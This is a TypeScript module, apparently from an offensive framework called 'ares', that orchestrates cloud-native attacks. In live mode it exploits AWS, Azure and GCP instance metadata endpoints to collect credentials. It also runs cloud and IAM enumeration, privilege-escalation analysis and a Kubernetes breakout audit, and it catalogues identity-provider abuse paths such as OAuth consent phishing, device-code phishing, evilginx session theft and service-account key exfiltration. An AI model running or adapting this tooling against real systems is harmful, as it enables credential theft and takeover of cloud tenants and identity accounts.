/**
 * @module ares/cloud_native
 * Cloud-native attacks — MetadataExploit, AWS/Azure/GCP recon, K8s breakout, IdP OAuth paths.
 */
import { MetadataExploit, AWSRecon, AzureRecon, GCPRecon, IAMEnumerator, CloudPrivEsc } from "../cloud.ts"
import { auditCluster } from "../container_k8s.ts"
import { fuseMultiCloudAsm } from "../multi_cloud_asm.ts"
import { AttackSurfaceGraph } from "../attack_surface.ts"
import { liveRequired, writeArtifact } from "./_base.ts"
import { step, type ExecStep } from "./_integrations.ts"
import { resolveDryRun } from "../exec_options.ts"
import { SAAS_HINTS } from "../institutional_hints.ts"
import { httpProbe } from "../domain_probe.ts"

export interface IdpOAuthReconResult {
  providers: string[]
  abusePaths: Array<{ id: string; provider: string; vector: string; severity: string }>
  dryRun: boolean
  summary: string
  wellKnownProbes?: Array<{ url: string; status: number; ok: boolean }>
  imdsProbe?: { accessible: boolean; provider?: string; error?: string }
}

export interface CloudNativeResult {
  platforms: string[]
  steps: ExecStep[]
  artifacts: string[]
  summary: string
  idpRecon?: IdpOAuthReconResult
}

const IDP_ABUSE_PATHS = [
  { id: "oauth-consent-phish", provider: "entra", vector: "Malicious OAuth app consent (offline_access scope)", severity: "high" },
  { id: "oauth-device-code", provider: "entra", vector: "Device code flow phishing for refresh tokens", severity: "high" },
  { id: "okta-session-hijack", provider: "okta", vector: "Session cookie theft via AitM / evilginx phishlet", severity: "critical" },
  { id: "okta-api-token", provider: "okta", vector: "SSWS API token enumeration via leaked admin creds", severity: "high" },
  { id: "google-oauth-token", provider: "google", vector: "Google Workspace OAuth token replay / domain-wide delegation abuse", severity: "high" },
  { id: "google-sa-key", provider: "google", vector: "Service account key exfil for GCP/Workspace pivot", severity: "critical" },
]

function isCloudMetadataTarget(hint: string): boolean {
  const t = hint.trim()
  return t.includes("169.254.169.254") || /^\d{1,3}(\.\d{1,3}){3}$/.test(t)
}

function buildWellKnownUrls(providers: string[], tenant?: string): string[] {
  const urls: string[] = []
  if (providers.includes("entra")) {
    urls.push("https://login.microsoftonline.com/common/.well-known/openid-configuration")
    if (tenant) urls.push(`https://login.microsoftonline.com/${tenant}/.well-known/openid-configuration`)
  }
  if (providers.includes("okta")) {
    const host = tenant && tenant.includes(".") ? tenant : tenant ? `${tenant}.okta.com` : null
    if (host) {
      urls.push(`https://${host}/.well-known/openid-configuration`)
      urls.push(`https://${host}/oauth2/v1/authorize`)
    }
  }
  if (providers.includes("google")) {
    urls.push("https://accounts.google.com/.well-known/openid-configuration")
  }
  return [...new Set(urls)]
}

/** Read-only IdP OAuth abuse path enumeration — live mode adds well-known + IMDS probes. */
export async function reconIdpOAuthPaths(opts: {
  hint?: string
  tenant?: string
  live?: boolean
  dryRun?: boolean
} = {}): Promise<IdpOAuthReconResult> {
  const dryRun = resolveDryRun(opts)
  const h = (opts.hint ?? opts.tenant ?? "").toLowerCase()
  const providers: string[] = []
  if (!h || /\b(entra|azure.?ad|microsoft)\b/.test(h)) providers.push("entra")
  if (!h || /\bokta\b/.test(h)) providers.push("okta")
  if (!h || /\b(google|workspace|gsuite)\b/.test(h)) providers.push("google")
  if (providers.length === 0) providers.push("entra", "okta", "google")

  const abusePaths = IDP_ABUSE_PATHS.filter((p) => providers.includes(p.provider))

  if (dryRun) {
    return {
      providers,
      abusePaths,
      dryRun,
      summary: `dry-run: ${abusePaths.length} OAuth abuse path(s) for ${providers.join(", ")}`,
    }
  }

  const wellKnownUrls = buildWellKnownUrls(providers, opts.tenant ?? opts.hint)
  const wellKnownProbes = await Promise.all(
    wellKnownUrls.map(async (url) => {
      const p = await httpProbe(url)
      return { url, status: p.status, ok: p.ok }
    }),
  )

  let imdsProbe: IdpOAuthReconResult["imdsProbe"]
  const targetHint = `${opts.hint ?? ""} ${opts.tenant ?? ""}`.trim()
  if (isCloudMetadataTarget(targetHint)) {
    const meta = new MetadataExploit({ live: true })
    for (const [provider, fn] of [
      ["aws", () => meta.exploitAws()],
      ["azure", () => meta.exploitAzure()],
      ["gcp", () => meta.exploitGcp()],
    ] as const) {
      const r = await fn()
      if (r.accessible) {
        imdsProbe = { accessible: true, provider }
        break
      }
      if (r.error && !imdsProbe) imdsProbe = { accessible: false, error: r.error.slice(0, 120) }
    }
    if (!imdsProbe) imdsProbe = { accessible: false, error: "IMDS not reachable from this host" }
  }

  const okCount = wellKnownProbes.filter((p) => p.ok).length
  const imdsNote = imdsProbe?.accessible ? `; IMDS ${imdsProbe.provider} accessible` : imdsProbe ? "; IMDS not accessible" : ""

  return {
    providers,
    abusePaths,
    dryRun,
    wellKnownProbes,
    imdsProbe,
    summary: `${abusePaths.length} IdP OAuth vector(s); ${okCount}/${wellKnownProbes.length} well-known probe(s) ok${imdsNote}`,
  }
}

export async function runCloudNativeAttack(opts: {
  live?: boolean
  tenant?: string
  subscription?: string
  hint?: string
}): Promise<CloudNativeResult> {
  const dryRun = resolveDryRun(opts)
  const h = `${opts.hint ?? ""} ${opts.tenant ?? ""}`
  const saasHint = SAAS_HINTS.test(h)

  const idpRecon = await reconIdpOAuthPaths({ hint: h, tenant: opts.tenant, live: opts.live, dryRun })
  const idpArtifact = writeArtifact("cloud", "idp_oauth_recon.json", JSON.stringify(idpRecon, null, 2))

  if (dryRun && saasHint) {
    return {
      platforms: ["idp_oauth_recon"],
      steps: [step("idp_oauth_recon", true, idpRecon.summary)],
      artifacts: [idpArtifact],
      summary: idpRecon.summary,
      idpRecon,
    }
  }

  liveRequired("ares_cloud_native", opts)
  const platforms: string[] = []
  const steps: ExecStep[] = []
  const artifacts: string[] = []

  const meta = new MetadataExploit({ live: true })
  for (const [name, fn] of [
    ["aws_imds", () => meta.exploitAws()],
    ["azure_imds", () => meta.exploitAzure()],
    ["gcp_imds", () => meta.exploitGcp()],
  ] as const) {
    const r = await fn()
    platforms.push(name)
    const fp = writeArtifact("cloud", `${name}.json`, JSON.stringify(r, null, 2))
    artifacts.push(fp)
    steps.push(step(name, r.accessible || !!r.data, r.error || `${r.credentials.length} cred(s)`))
  }

  const aws = new AWSRecon()
  const awsResult = await aws.enumerateAll()
  platforms.push("aws_recon")
  artifacts.push(writeArtifact("cloud", "aws_recon.json", JSON.stringify(awsResult, null, 2)))
  steps.push(step("aws_recon", !("error" in awsResult && awsResult.error), JSON.stringify(awsResult).slice(0, 300)))

  const azure = new AzureRecon()
  const azResult = await azure.enumerateAll()
  platforms.push("azure_recon")
  artifacts.push(writeArtifact("cloud", "azure_recon.json", JSON.stringify(azResult, null, 2)))
  steps.push(step("azure_recon", !("error" in azResult && azResult.error), JSON.stringify(azResult).slice(0, 300)))

  const gcp = new GCPRecon()
  const gcpResult = await gcp.enumerateAll()
  platforms.push("gcp_recon")
  artifacts.push(writeArtifact("cloud", "gcp_recon.json", JSON.stringify(gcpResult, null, 2)))
  steps.push(step("gcp_recon", !("error" in gcpResult && gcpResult.error), JSON.stringify(gcpResult).slice(0, 300)))

  const iam = new IAMEnumerator()
  const iamResult = await iam.enumerateAll()
  platforms.push("iam_enum")
  artifacts.push(writeArtifact("cloud", "iam_enum.json", JSON.stringify(iamResult, null, 2)))
  steps.push(step("iam_enum", true, JSON.stringify(iamResult).slice(0, 300)))

  const privEsc = new CloudPrivEsc()
  const peResult = {
    aws: await privEsc.analyzeAws(),
    azure: await privEsc.analyzeAzure(opts.subscription),
    gcp: await privEsc.analyzeGcp(),
  }
  platforms.push("cloud_privesc")
  artifacts.push(writeArtifact("cloud", "privesc_paths.json", JSON.stringify(peResult, null, 2)))
  steps.push(step("cloud_privesc", true, JSON.stringify(peResult).slice(0, 300)))

  let k8sStep = step("k8s_audit", false, "skipped — kubectl not available")
  try {
    const k8s = await auditCluster({ live: true, quick: false })
    platforms.push("kubernetes_breakout")
    artifacts.push(writeArtifact("cloud", "k8s_audit.json", JSON.stringify(k8s, null, 2)))
    k8sStep = step("k8s_audit", k8s.findings.length >= 0, `${k8s.findings.length} finding(s)`)
  } catch (err) {
    k8sStep = step("k8s_audit", false, String((err as Error).message).slice(0, 200))
  }
  steps.push(k8sStep)

  const graph = new AttackSurfaceGraph("cloud")
  const fused = await fuseMultiCloudAsm(graph, { live: true, target: "169.254.169.254" })
  platforms.push("multi_cloud_asm")
  steps.push(step("multi_cloud_asm", fused.fusedCount >= 0, `${fused.fusedCount} fused asset(s)`))

  return {
    platforms,
    steps,
    artifacts: [...artifacts, idpArtifact],
    summary: `Cloud-native: ${platforms.length} platform(s), ${steps.filter((s) => s.success).length}/${steps.length} live probe(s) ok`,
    idpRecon,
  }
}

export default { runCloudNativeAttack, reconIdpOAuthPaths }
